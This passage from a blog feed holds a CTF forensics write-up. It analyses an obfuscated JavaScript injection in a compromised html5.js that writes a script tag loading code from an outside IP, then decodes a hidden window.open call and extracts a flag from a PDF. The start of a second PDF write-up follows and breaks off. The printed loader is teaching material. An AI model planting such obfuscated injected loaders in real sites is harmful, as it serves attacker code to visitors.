&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ diff html5.js html5_normal.js
&lt;span class="m"&gt;93&lt;/span&gt;,122d92
&amp;lt; var &lt;span class="nv"&gt;g&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ti&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&amp;lt; var &lt;span class="nv"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;HTML Tags&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&amp;lt; var &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;. li colgroup br src datalist script option .&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&amp;lt; &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; f.split&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&amp;lt; &lt;span class="nv"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&amp;lt; &lt;span class="nv"&gt;k&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&amp;lt; &lt;span class="nv"&gt;m&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; f&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&amp;lt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;var &lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; i &amp;lt; f.length&lt;span class="p"&gt;;&lt;/span&gt; i++&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&amp;lt;     &lt;span class="nv"&gt;c&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; f&lt;span class="o"&gt;[&lt;/span&gt;i&lt;span class="o"&gt;]&lt;/span&gt;.length.toString&lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&amp;lt; &lt;span class="o"&gt;}&lt;/span&gt;
&amp;lt; &lt;span class="nv"&gt;v&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; f&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&amp;lt; &lt;span class="nv"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;\&amp;#39;ht&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&amp;lt; &lt;span class="nv"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; f&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&amp;lt; &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;2541&lt;/span&gt; * &lt;span class="m"&gt;6&lt;/span&gt; - &lt;span class="m"&gt;35&lt;/span&gt; + &lt;span class="m"&gt;46&lt;/span&gt; + &lt;span class="m"&gt;12&lt;/span&gt; - &lt;span class="m"&gt;15269&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&amp;lt; &lt;span class="nv"&gt;c&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; f.toString&lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&amp;lt; &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;56&lt;/span&gt; + &lt;span class="m"&gt;31&lt;/span&gt; + &lt;span class="m"&gt;68&lt;/span&gt; * &lt;span class="m"&gt;65&lt;/span&gt; + &lt;span class="m"&gt;41&lt;/span&gt; - &lt;span class="m"&gt;548&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; / &lt;span class="m"&gt;4000&lt;/span&gt; - &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&amp;lt; &lt;span class="nv"&gt;c&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; f.toString&lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&amp;lt; &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&amp;lt; &lt;span class="nv"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; c.split&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&amp;lt; var &lt;span class="nv"&gt;w&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&amp;lt; &lt;span class="nv"&gt;u&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&amp;lt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;var &lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; i &amp;lt; c.length&lt;span class="p"&gt;;&lt;/span&gt; i++&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&amp;lt;     &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(((&lt;/span&gt;&lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="m"&gt;6&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; w !&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="m"&gt;8&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nv"&gt;w&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&amp;lt;         &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; String.fromCharCode&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;46&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&amp;lt;         w++&lt;span class="p"&gt;;&lt;/span&gt;
&amp;lt;     &lt;span class="o"&gt;}&lt;/span&gt;
&amp;lt;     &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; c&lt;span class="o"&gt;[&lt;/span&gt;i&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&amp;lt; &lt;span class="o"&gt;}&lt;/span&gt;
&amp;lt; &lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; k + &lt;span class="s2"&gt;&amp;quot;anal&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&amp;lt; document.write&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;lt;&amp;quot;&lt;/span&gt; + m + &lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt; + b + &lt;span class="s2"&gt;&amp;quot;=&amp;quot;&lt;/span&gt; + x + &lt;span class="s2"&gt;&amp;quot;tp:&amp;quot;&lt;/span&gt; + k + k + f + i + &lt;span class="s2"&gt;&amp;quot;y&amp;quot;&lt;/span&gt; + g + &lt;span class="s2"&gt;&amp;quot;c&amp;quot;&lt;/span&gt; + u + v + &lt;span class="s2"&gt;&amp;quot;j&amp;quot;&lt;/span&gt; + u + &lt;span class="s2"&gt;&amp;quot;\&amp;#39;&amp;gt;\&amp;lt;/&amp;quot;&lt;/span&gt; + m + &lt;span class="s2"&gt;&amp;quot;\&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Aha!!! So what is being written?&lt;/p&gt;
&lt;p&gt;In JavaScript, the function &lt;code&gt;document.write()&lt;/code&gt; writes HTML expressions or JavaScript code to a document. However, we can debug it in the console if we want, changing it to &lt;code&gt;console.log()&lt;/code&gt; (and changing any &lt;code&gt;document&lt;/code&gt; word to &lt;code&gt;console&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;To run JavaScript in the console, you need to install &lt;a href="http://nodejs.org/"&gt;Node&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;So we run and we get a URL:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ node html5.js
&amp;lt;script &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://128.238.66.100/analytics.js&amp;#39;&lt;/span&gt;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;hr&gt;
&lt;h2&gt;Analyzing the Second JavaScript Exploit&lt;/h2&gt;
&lt;p&gt;Awesome, we see a script exploit! Let's get it!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$  wget http://128.238.66.100/analytics.js
--2014-09-25 &lt;span class="m"&gt;19&lt;/span&gt;:17:19--  http://128.238.66.100/analytics.js
Connecting to &lt;span class="m"&gt;128&lt;/span&gt;.238.66.100:80... connected.
HTTP request sent, awaiting response... &lt;span class="m"&gt;200&lt;/span&gt; OK
Length: &lt;span class="m"&gt;16072&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;16K&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;application/javascript&lt;span class="o"&gt;]&lt;/span&gt;
Saving to: ‘analytics.js’

&lt;span class="m"&gt;100&lt;/span&gt;%&lt;span class="o"&gt;[===============================================================================&lt;/span&gt;&amp;gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;16&lt;/span&gt;,072      --.-K/s   in &lt;span class="m"&gt;0&lt;/span&gt;.008s

&lt;span class="m"&gt;2014&lt;/span&gt;-09-25 &lt;span class="m"&gt;19&lt;/span&gt;:17:19 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.02 MB/s&lt;span class="o"&gt;)&lt;/span&gt; - ‘analytics.js’ saved &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;16072&lt;/span&gt;/16072&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The file turns out to be large, and &lt;em&gt;grep&lt;/em&gt; &lt;em&gt;flag&lt;/em&gt; or &lt;em&gt;key&lt;/em&gt; doesn't show any hit. No IP addresses or URL neither.&lt;/p&gt;
&lt;p&gt;OK, let's take a closer look. We open the file in a text editor and we find a weird hex-encoded variable that is completely unconnected from the rest:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;var _0x91fe = [&amp;quot;\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66&amp;quot;, &amp;quot;\x5F\x73\x65\x6C\x66&amp;quot;, &amp;quot;\x6F\x70\x65\x6E&amp;quot;];
window[_0x91fe[2]](_0x91fe[0], _0x91fe[1]);
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We decode it using Python or a &lt;a href="http://ddecode.com/hexdecoder/"&gt;online hex-decode&lt;/a&gt; and we get another file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x5F\x73\x65\x6C\x66&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x6F\x70\x65\x6E&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://128.238.66.100/announcement.pdf&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;_self&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;open&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Opening the URL leads to this picture:
&lt;img alt="" src="http://i.imgur.com/CNEQhfG.png"&gt;&lt;/p&gt;
&lt;p&gt;LOL. Funny, but no flag yet...&lt;/p&gt;
&lt;p&gt;It should be in the PDF somewhere!&lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;Finding the Second Hex-encoded String: Approach I&lt;/h2&gt;
&lt;p&gt;All right, let's use what we learned from the &lt;a href="http://bt3gl.github.io/forensics-200-obscurity.html"&gt;CSAW CTF 2014 Forensic -Obscurity&lt;/a&gt; problem. First, let's see if we find the flag with a simple grep:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$./pdf-parser.py announcement.pdf &lt;span class="p"&gt;|&lt;/span&gt; grep flag
$./pdf-parser.py announcement.pdf &lt;span class="p"&gt;|&lt;/span&gt; grep key
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No luck. Let us ID the file to see if we find any funny stream:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./pdfid.py announcement.pdf PDFiD &lt;span class="m"&gt;0&lt;/span&gt;.1.2 announcement.pdf
 PDF Header: %PDF-1.4
 obj                    &lt;span class="m"&gt;9&lt;/span&gt;
 endobj                 &lt;span class="m"&gt;9&lt;/span&gt;
 stream                 &lt;span class="m"&gt;4&lt;/span&gt;
 endstream              &lt;span class="m"&gt;4&lt;/span&gt;
 xref                   &lt;span class="m"&gt;1&lt;/span&gt;
 trailer                &lt;span class="m"&gt;1&lt;/span&gt;
 startxref              &lt;span class="m"&gt;1&lt;/span&gt;
 /Page                  &lt;span class="m"&gt;1&lt;/span&gt;
 /Encrypt               &lt;span class="m"&gt;0&lt;/span&gt;
 /ObjStm                &lt;span class="m"&gt;0&lt;/span&gt;
 /JS                    &lt;span class="m"&gt;0&lt;/span&gt;
 /JavaScript            &lt;span class="m"&gt;0&lt;/span&gt;
 /AA                    &lt;span class="m"&gt;0&lt;/span&gt;
 /OpenAction            &lt;span class="m"&gt;0&lt;/span&gt;
 /AcroForm              &lt;span class="m"&gt;0&lt;/span&gt;
 /JBIG2Decode           &lt;span class="m"&gt;0&lt;/span&gt;
 /RichMedia             &lt;span class="m"&gt;0&lt;/span&gt;
 /Launch                &lt;span class="m"&gt;0&lt;/span&gt;
 /EmbeddedFile          &lt;span class="m"&gt;1&lt;/span&gt;
 /XFA                   &lt;span class="m"&gt;0&lt;/span&gt;
 /Colors &amp;gt; &lt;span class="m"&gt;2&lt;/span&gt;^24         &lt;span class="m"&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Oh, cool, there is a &lt;strong&gt;Embedded File&lt;/strong&gt;! Let's look closer to this object:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./pdf-parser.py --stats announcement.pdf Comment: &lt;span class="m"&gt;3&lt;/span&gt;
XREF: &lt;span class="m"&gt;1&lt;/span&gt;
Trailer: &lt;span class="m"&gt;1&lt;/span&gt;
StartXref: &lt;span class="m"&gt;1&lt;/span&gt;
Indirect object: &lt;span class="m"&gt;9&lt;/span&gt;
  &lt;span class="m"&gt;2&lt;/span&gt;: &lt;span class="m"&gt;3&lt;/span&gt;, &lt;span class="m"&gt;7&lt;/span&gt;
 /Catalog &lt;span class="m"&gt;1&lt;/span&gt;: &lt;span class="m"&gt;6&lt;/span&gt;
 /EmbeddedFile &lt;span class="m"&gt;1&lt;/span&gt;: &lt;span class="m"&gt;8&lt;/span&gt;
 /Filespec &lt;span class="m"&gt;1&lt;/span&gt;: &lt;span class="m"&gt;9&lt;/span&gt;
 /Page &lt;span class="m"&gt;1&lt;/span&gt;: &lt;span class="m"&gt;5&lt;/span&gt;
 /Pages &lt;span class="m"&gt;1&lt;/span&gt;: &lt;span class="m"&gt;4&lt;/span&gt;
 /XObject &lt;span class="m"&gt;2&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt;, &lt;span class="m"&gt;2&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nice. So now we can decode our pdf file using the &lt;strong&gt;object code&lt;/strong&gt;, which we can see  above that is &lt;strong&gt;8&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./pdf-parser.py --object &lt;span class="m"&gt;8&lt;/span&gt; --raw --filter announcement.pdf
obj &lt;span class="m"&gt;8&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
 Type: /EmbeddedFile
 Referencing:
 Contains stream

  &amp;lt;&amp;lt;
    /Length &lt;span class="m"&gt;212&lt;/span&gt;
    /Type /EmbeddedFile
    /Filter /FlateDecode
    /Params
      &amp;lt;&amp;lt;
        /Size &lt;span class="m"&gt;495&lt;/span&gt;
        /Checksum &amp;lt;7f0104826bde58b80218635f639b50a9&amp;gt;
      &amp;gt;&amp;gt;
    /Subtype /application/pdf
  &amp;gt;&amp;gt;

 var &lt;span class="nv"&gt;_0xee0b&lt;/span&gt;&lt;span class="o"&gt;=[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;var &lt;span class="nv"&gt;y&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;_0xee0b&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Which &lt;em&gt;finally&lt;/em&gt; leads to our flag!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;YOU&lt;/span&gt; &lt;span class="n"&gt;DID&lt;/span&gt; &lt;span class="n"&gt;IT&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt; &lt;span class="n"&gt;CONGRATS&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt; &lt;span class="n"&gt;fwiw&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;javascript&lt;/span&gt; &lt;span class="n"&gt;obfuscation&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="n"&gt;sofa&lt;/span&gt; &lt;span class="n"&gt;king&lt;/span&gt; &lt;span class="n"&gt;dumb&lt;/span&gt;  &lt;span class="p"&gt;:)&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;Those&lt;/span&gt; &lt;span class="n"&gt;Fluffy&lt;/span&gt; &lt;span class="n"&gt;Bunnies&lt;/span&gt; &lt;span class="n"&gt;Make&lt;/span&gt; &lt;span class="n"&gt;Tummy&lt;/span&gt; &lt;span class="n"&gt;Bumpy&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;hr&gt;
&lt;h2&gt;Finding the Second Hex-encoded String: Approach II&lt;/h2&gt;
&lt;p&gt;There is a nice tool called &lt;a href="http://qpdf.sourceforge.net/"&gt;qpdf&lt;/a&gt; that can be very useful here:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudp yum install qpdf
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now, we just do the following conversion:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ qpdf  --qdf  announcement.pdf  unpacked.pdf
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Opening &lt;em&gt;unpacket.pdf&lt;/em&gt; with &lt;a href="http://tarot.freeshell.org/leafpad/"&gt;l3afpad&lt;/a&gt; also leads to the flag :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;stream
var _0xee0b=[&amp;quot;\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D&amp;quot;];var y=_0xee0b[0];
endstream
endobj
&lt;/pre&gt;&lt;/div&gt;


&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;That's it! Hack all the things!&lt;/strong&gt;&lt;/p&gt;</content><category term="CTF"></category><category term="CSAW"></category><category term="hashcat"></category><category term="pdf-parser"></category><category term="qpdf"></category><category term="LAMP"></category><category term="JavaScript"></category></entry><entry><title>CSAW CTF 2014 - Forensics 200: "Obscurity"</title><link href="http://bt3gl.github.io/csaw-ctf-2014-forensics-200-obscurity.html" rel="alternate"></link><published>2014-09-22T07:20:00-04:00</published><updated>2014-09-22T07:20:00-04:00</updated><author><name>Marina von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-09-22:/csaw-ctf-2014-forensics-200-obscurity.html</id><summary type="html">&lt;p&gt;The third forensics challenge starts with the following text:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;see or do not see&lt;/p&gt;
&lt;p&gt;Written by marc&lt;/p&gt;
&lt;p&gt;&lt;a href="https://ctf.isis.poly.edu/static/uploads/883c7046854e04138c55680ffde90a61/pdf.pdf"&gt;pdf.pdf&lt;/a&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Hacking PDFs, what fun!&lt;/p&gt;
&lt;p&gt;In general, when dealing with reverse-engineering malicious documents, we follow these steps:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; 1. We search for malicious embedded code (shell code, JavaScript).

 2. We extract any suspicious …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;The third forensics challenge starts with the following text:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;see or do not see&lt;/p&gt;
&lt;p&gt;Written by marc&lt;/p&gt;
&lt;p&gt;&lt;a href="https://ctf.isis.poly.edu/static/uploads/883c7046854e04138c55680ffde90a61/pdf.pdf"&gt;pdf.pdf&lt;/a&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Hacking PDFs, what fun!&lt;/p&gt;
&lt;p&gt;In general, when dealing with reverse-engineering malicious documents, we follow these steps:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; 1. We search for malicious embedded code (shell code, JavaScript).

 2. We extract any suspicious code segments

 3. If we see shell code, we disassemble or debug it. If we see JavaScript (or ActionScript or VB macro code), we try to examine it.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;However, this problem turned out to be very simple...&lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;Finding the Flag in 10 Seconds&lt;/h2&gt;
&lt;p&gt;Yeap, this easy:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;1. Download the PDF file.

2. Open it in any PDF viewer.

3. CTRL+A (select all the contend).

4. You see the flag!
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/b03EehK.png"&gt;&lt;/p&gt;
&lt;p&gt;OK, we were luck. Keep reading if you think this was too easy.&lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;Analyzing the ID and the Streams in a PDF File&lt;/h2&gt;
